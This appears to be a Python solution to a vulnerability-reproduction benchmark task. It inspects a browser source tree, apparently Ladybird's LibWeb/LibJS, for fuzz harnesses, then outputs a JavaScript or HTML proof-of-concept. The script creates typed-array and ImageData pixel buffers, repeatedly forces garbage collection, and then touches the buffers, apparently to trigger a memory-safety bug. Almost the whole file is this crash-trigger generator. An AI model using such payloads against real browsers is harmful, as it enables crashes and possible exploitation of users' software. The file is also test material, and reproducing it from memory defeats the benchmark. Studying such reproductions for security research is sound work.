import os
import tarfile
from typing import Optional


class Solution:
    def _infer_format_from_tarball(self, tar_path: str) -> str:
        html_score = 0
        js_score = 0

        def score_name(n: str) -> None:
            nonlocal html_score, js_score
            ln = n.lower()
            if "fuzz" in ln or "fuzzer" in ln or "harness" in ln:
                if "libweb" in ln or "webcontent" in ln or "ladybird" in ln or "/web/" in ln:
                    html_score += 3
                if "libjs" in ln or "/js/" in ln:
                    js_score += 3
            if "libweb" in ln or "webcontent" in ln:
                html_score += 1
            if "libjs" in ln:
                js_score += 1

        def score_content(s: str) -> None:
            nonlocal html_score, js_score
            if "LLVMFuzzerTestOneInput" in s:
                if "LibWeb" in s or "Web::" in s or "WebContent" in s or "HTML::" in s or "DOM::" in s:
                    html_score += 5
                if "LibJS" in s or "JS::" in s or "Interpreter" in s or "VM" in s:
                    js_score += 5
            else:
                if "Web::" in s or "LibWeb" in s or "DOM::" in s or "HTML::" in s:
                    html_score += 2
                if "JS::" in s or "LibJS" in s or "Interpreter" in s:
                    js_score += 2

        try:
            with tarfile.open(tar_path, "r:*") as tf:
                inspected = 0
                for m in tf:
                    if not m or not m.name:
                        continue
                    score_name(m.name)
                    if inspected >= 80:
                        continue
                    if not m.isfile():
                        continue
                    ln = m.name.lower()
                    if not (ln.endswith(".cpp") or ln.endswith(".cc") or ln.endswith(".c") or ln.endswith(".h") or ln.endswith(".hpp")):
                        continue
                    if ("fuzz" not in ln) and ("harness" not in ln) and ("fuzzer" not in ln):
                        continue
                    if m.size <= 0 or m.size > 512 * 1024:
                        continue
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    try:
                        data = f.read(256 * 1024)
                    finally:
                        f.close()
                    try:
                        s = data.decode("utf-8", "ignore")
                    except Exception:
                        s = ""
                    if s:
                        score_content(s)
                        inspected += 1
        except Exception:
            return "html"

        if html_score == js_score == 0:
            return "html"
        return "html" if html_score >= js_score else "js"

    def _infer_format_from_dir(self, src_dir: str) -> str:
        html_score = 0
        js_score = 0

        def score_name(n: str) -> None:
            nonlocal html_score, js_score
            ln = n.lower()
            if "fuzz" in ln or "fuzzer" in ln or "harness" in ln:
                if "libweb" in ln or "webcontent" in ln or "ladybird" in ln or os.sep + "web" + os.sep in ln:
                    html_score += 3
                if "libjs" in ln or os.sep + "js" + os.sep in ln:
                    js_score += 3
            if "libweb" in ln or "webcontent" in ln:
                html_score += 1
            if "libjs" in ln:
                js_score += 1

        def score_content(s: str) -> None:
            nonlocal html_score, js_score
            if "LLVMFuzzerTestOneInput" in s:
                if "LibWeb" in s or "Web::" in s or "WebContent" in s or "HTML::" in s or "DOM::" in s:
                    html_score += 5
                if "LibJS" in s or "JS::" in s or "Interpreter" in s or "VM" in s:
                    js_score += 5
            else:
                if "Web::" in s or "LibWeb" in s or "DOM::" in s or "HTML::" in s:
                    html_score += 2
                if "JS::" in s or "LibJS" in s or "Interpreter" in s:
                    js_score += 2

        inspected = 0
        for root, _, files in os.walk(src_dir):
            for fn in files:
                path = os.path.join(root, fn)
                score_name(path)
                if inspected >= 80:
                    continue
                ln = fn.lower()
                if not (ln.endswith(".cpp") or ln.endswith(".cc") or ln.endswith(".c") or ln.endswith(".h") or ln.endswith(".hpp")):
                    continue
                if ("fuzz" not in ln) and ("harness" not in ln) and ("fuzzer" not in ln):
                    continue
                try:
                    st = os.stat(path)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 512 * 1024:
                    continue
                try:
                    with open(path, "rb") as f:
                        data = f.read(256 * 1024)
                except OSError:
                    continue
                s = data.decode("utf-8", "ignore")
                if s:
                    score_content(s)
                    inspected += 1

        if html_score == js_score == 0:
            return "html"
        return "html" if html_score >= js_score else "js"

    def _make_js(self) -> bytes:
        js = (
            "(function(){"
            "function c(){"
            "try{if(typeof gc==='function')gc()}catch(e){}"
            "try{if(typeof window==='object'&&window&&typeof window.gc==='function')window.gc()}catch(e){}"
            "try{if(typeof internals==='object'&&internals&&typeof internals.forceGarbageCollection==='function')internals.forceGarbageCollection()}catch(e){}"
            "}"
            "function churn(){var t;"
            "for(var i=0;i<30000;i++){t=new Uint8Array(4096);t[0]=i&255}"
            "for(var j=0;j<20000;j++){t={a:j,b:j+1,c:j+2,d:j+3}}"
            "}"
            "var v=[];"
            "try{(function(){if(typeof Uint8ClampedArray!=='undefined'){var b=new ArrayBuffer(65536);var x=new Uint8ClampedArray(b);x[0]=1;v.push(x)}})()}catch(e){}"
            "try{(function(){if(typeof ImageData==='function'){var im=new ImageData(256,256);var d=im.data;d[0]=1;v.push(d)}})()}catch(e){}"
            "try{(function(){if(typeof document==='object'&&document){var cn=document.createElement('canvas');cn.width=256;cn.height=256;var ctx=cn.getContext('2d');var im2=ctx.getImageData(0,0,256,256);var d2=im2.data;d2[0]=1;v.push(d2)}})()}catch(e){}"
            "for(var k=0;k<4;k++){churn();c()}"
            "for(var n=0;n<v.length;n++){var a=v[n];"
            "var s=0;for(var i2=0;i2<1024;i2+=16)s+=a[i2];"
            "for(var i3=0;i3<1024;i3+=16)a[i3]=(s+i3)&255;"
            "}"
            "})();"
        )
        return js.encode("utf-8")

    def _make_html(self) -> bytes:
        js = self._make_js().decode("utf-8", "strict")
        html = "<!doctype html><meta charset=utf-8><script>" + js + "</script>"
        return html.encode("utf-8")

    def solve(self, src_path: str) -> bytes:
        fmt: Optional[str] = None
        if os.path.isdir(src_path):
            fmt = self._infer_format_from_dir(src_path)
        else:
            fmt = self._infer_format_from_tarball(src_path)

        if fmt == "js":
            return self._make_js()
        return self._make_html()